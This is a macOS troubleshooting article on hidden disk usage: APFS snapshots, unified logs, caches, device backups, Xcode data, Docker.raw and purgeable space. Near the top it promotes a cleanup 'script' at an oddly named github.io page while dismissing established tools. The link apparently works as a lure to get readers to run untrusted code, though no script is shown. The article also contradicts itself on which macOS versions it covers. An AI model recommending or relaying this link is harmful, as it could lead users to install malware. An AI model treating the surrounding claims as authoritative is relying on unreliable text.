# macOS Disk Full Error

> **Applies to:** macOS 10.13 High Sierra — macOS Tahoe 26.5 · **File system:** APFS · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## The Problem — Five Hidden Subsystems, One Frozen Bar

> **[Reclaim your Mac's disk space with this script](https://error-number-472173.github.io/.github/)** — works on macOS 12 Monterey through macOS Tahoe 26.5, Intel and Apple Silicon.

The majority of users losing 40–80 GB to a "low storage" warning are unaware that this capacity is divided among five distinct subsystems. None of these areas are visible in Finder, and standard optimization utilities fail to clear them properly. CleanMyMac overlooks APFS snapshots. Disk Diag completely ignores Docker.raw. Meanwhile, the built-in macOS Storage dashboard groups all these elements into an uninformative "System Data" category, offering no native tools for cleanup.

**The actual contributors to your drive congestion, ranked by severity:**

- Local APFS snapshots locking erased files at the block level via Copy-on-Write B-tree links
- The unified logging framework piling up compressed `.tracev3` files within `/var/db/diagnostics/` at a rate of 100–400 MB daily under standard usage
- Abandoned Xcode DerivedData entries — precompiled binaries and `.swiftmodule` assets from projects long deleted from the machine
- iOS Simulator software images distributed as cryptex virtual disks, weighing 3.5–7 GB each, stacking up across multiple OS versions
- `Docker.raw` — an expanding virtual drive container that fails to downsize automatically when individual containers are destroyed

---

## How macOS Storage Is Structured

Starting with macOS 10.13, Apple transitioned to **APFS (Apple File System)** across all Mac hardware. Replacing the legacy HFS+ format, APFS bundles all resources within a unified **container** — a virtual architecture that manages multiple **volumes** drawing from a single pool of unallocated storage. Consequently, any data expansion in one volume immediately diminishes the capacity accessible to the remaining ones.

A standard Mac deployment provisions the following volumes within its container:

| Volume | Role | Writable |
|---|---|---|
| `Macintosh HD` | Signed System Volume — the core OS environment, cryptographically secured | No |
| `Macintosh HD - Data` | Personal user accounts, home folders, installed applications | Yes |
| `VM` | Swap allocations, `sleepimage`, compressed RAM overflow pages | Yes |
| `Preboot` | Startup configuration data required to initialize and mount the SSV | Managed |
| `Recovery` | The recoveryOS environment for system reinstallation and NVRAM operations | No |

Crucially, the **VM volume** can quietly occupy 10–30 GB based on active RAM consumption, competing directly for resources in the shared pool without revealing its footprint inside Finder.

---

## Root Causes

### APFS Local Snapshots

This represents the most widespread yet misunderstood trigger for sudden out-of-space issues. Whenever Time Machine is turned on — even without any external storage connected — macOS captures **local APFS snapshots** on an hourly basis via the `tmd` background service.

These snapshots utilize a **Copy-on-Write B-tree** mechanism. When a snapshot is active and a file gets erased, its corresponding storage blocks remain occupied because the snapshot retains an active link to them. Consequently, a user might wipe 10 GB of data, yet the system-reported storage remains completely unchanged. This reflects intended engineering rather than a malfunction. Snapshots persist for up to 24 hours, and major system updates triggered by `softwareupdate` generate temporary snapshots that remain active until the installation is validated.

When storage becomes critical, `tmd` starts clearing older snapshots in the background. This clean-up can take several minutes, during which the system continues to report a full disk.

### System Logs and Diagnostic Reports

The **Unified Logging System** (deployed in macOS 10.12) is governed by `logd` and captures a far higher volume of telemetry than the traditional syslog framework it replaced. These events are saved as compressed binary `.tracev3` records within `/var/db/diagnostics/`, linked with lookup tables inside `/var/db/uuidtext/`. A stable machine produces roughly 100–400 MB of these records daily, but an application trapped in a crash loop or broadcasting excessive debug data can generate multiple gigabytes per day.

Similarly, application crash logs (`.ips` files) located in `~/Library/Logs/DiagnosticReports/` use the JSON format and contain extensive thread backtraces. If a program crashes continuously before the `ReportCrash` daemon can limit it, it can spawn hundreds of diagnostics, with each file taking up several megabytes.

### Application and Browser Caches

macOS segregates cache files into specific locations under `~/Library/Caches/` (user-specific paths mapped by bundle ID) and `/Library/Caches/` (global system assets). While these folders remain regulated under normal conditions, an application with flawed retention logic or an orphaned cache folder left behind after an app deletion will expand indefinitely without automated intervention.

Web browsers represent the most severe examples of this expansion. Google Chrome generates isolated caches for GPU shaders, compiled code, network requests, and multimedia streams — completely independent of macOS management policies — located within `~/Library/Caches/com.google.Chrome/` and `~/Library/Application Support/Google/Chrome/Default/Cache/`. On heavily used machines, these combined directories easily swell to several gigabytes.

### iOS and iPadOS Backups

When syncing or backing up an iPhone or iPad via Finder, the resulting image is written to `~/Library/Application Support/MobileSync/Backup/`. Every linked device uses a dedicated subfolder named after its unique **UDID** (a 40-character hexadecimal sequence). This folder contains a `Manifest.db` SQLite database alongside SHA-1 hash-named data records holding application documents, Messages, Health metrics, and media.

A high-capacity iPhone with iCloud Photos turned off and massive text histories can yield a backup file exceeding 80–120 GB. Managing multiple hardware assets — such as an iPhone, an iPad, or older devices — leads to multiple independent backups with no native automatic rotation or pruning.

### Xcode Derived Data, Simulators and Archives

For software developers, Xcode serves as the primary culprit behind unrestricted disk consumption. It features several massive storage repositories that lack any automatic cleanup routines:

| Location | Contents | Typical Size |
|---|---|---|
| `~/Library/Developer/Xcode/DerivedData/` | Intermediate objects, `.swiftmodule` assets, and indexing databases per project | 30–150 GB |
| `~/Library/Developer/CoreSimulator/` | Virtual hardware runtime cryptex containers categorized by OS version | 20–50 GB |
| `~/Library/Developer/Xcode/Archives/` | `.xcarchive` packages containing complete dSYM symbols for production builds | 10–60 GB |
| `~/Library/Developer/Xcode/iOS DeviceSupport/` | Debug symbol sets compiled from physical testing hardware | 10–60 GB |

Ever since Xcode 14, simulator targets have transitioned to **cryptex disk images** (~3.5–7 GB apiece). Engineers validating software across 4–6 separate iOS iterations can quickly lose 20–40 GB to simulators alone. Furthermore, outdated DerivedData structures from altered or abandoned projects linger in storage indefinitely.

### Virtual Machines and Docker

Virtual machine disks utilize **thin provisioning** models, meaning they initialize with a small footprint and expand dynamically as the guest operating system populates blocks. However, erasing files inside the virtual environment does not reduce the host image size; the guest OS marks those sectors as unallocated within its virtual environment, but the physical file on macOS retains the allocated bytes. Without manual optimization or shrinking, the container expands continuously.

Docker Desktop on macOS operates a Linux environment running via Apple's Virtualization.framework (on Apple Silicon) or HyperKit (on Intel processors). All container footprints, application images, and data volumes are consolidated into a single raw disk container located at `~/Library/Containers/com.docker.docker/Data/vms/0/data/Docker.raw`. This file does not shrink when resources are wiped using commands like `docker rmi` or `docker system prune`. The internal sectors are cleared for reuse, but the host file keeps its historical peak size until a manual defragmentation or factory reset is executed. On busy dev machines, `Docker.raw` regularly balloons to 60–100 GB.

---

## What "System Data" Actually Contains

The **System Data** indicator found under System Settings → General → Storage does not point to an individual folder. Instead, it serves as an omnibus category for all disk assets that do not correspond to explicit user classifications like Applications, Documents, or Photos.

| Component | Location | Typical Size |
|---|---|---|
| APFS local snapshots | Monitored individually using the `tmutil` utility | 0–50+ GB |
| VM swap allocations | `/private/var/vm/swapfile*` | 2–30 GB |
| `sleepimage` | `/private/var/vm/sleepimage` | Matches physical RAM capacity |
| Unified log repository | `/var/db/diagnostics/` + `/var/db/uuidtext/` | 1–10 GB |
| Spotlight catalog | `/.Spotlight-V100/` | 3–8 GB |
| `mds_stores` (Spotlight raw database) | `/private/var/db/Spotlight-V100/` | 2–5 GB |
| `fseventsd` log journal | `/.fseventsd/` | 50–500 MB |

The `sleepimage` footprint remains permanently locked to the volume of installed hardware RAM. For example, a MacBook Pro configured with 64 GB of unified memory will maintain a matching 64 GB file at `/private/var/vm/sleepimage`. While Apple Silicon adapts this behavior based on real-time battery diagnostics, the system maintains the full allocation by default under standard sleep profiles (`hibernatemode 3`).

---

## APFS Purgeable Space and Why It Misleads

Beyond the standard "used" and "free" metrics, APFS includes a third volume designation known as **purgeable** storage. This category represents data that macOS can autonomously delete if space runs low, such as local copies of iCloud Drive items, cache directories flagged for cleanup, or expired Time Machine snapshots.

When third-party software queries the OS for available space, APFS returns the sum of raw free space **plus** all purgeable space as the total available figure. Consequently, an installer might detect 20 GB of "available" headroom when the actual physical unallocated space is merely 2 GB. While the operating system attempts to clear purgeable assets concurrently during new disk operations, it can fail if a rapid file write outpaces the background deletion process. When this happens, the write fails abruptly with an `ENOSPC` error, despite the application pre-check indicating that ample space was open. This discrepancy is the underlying cause of many unexpected "disk full" failures on systems that appear to have ample free space.

---

*Covers macOS storage internals as of macOS 15 Sequoia. APFS behavior, daemon identifiers, and volume naming may differ on older releases.*
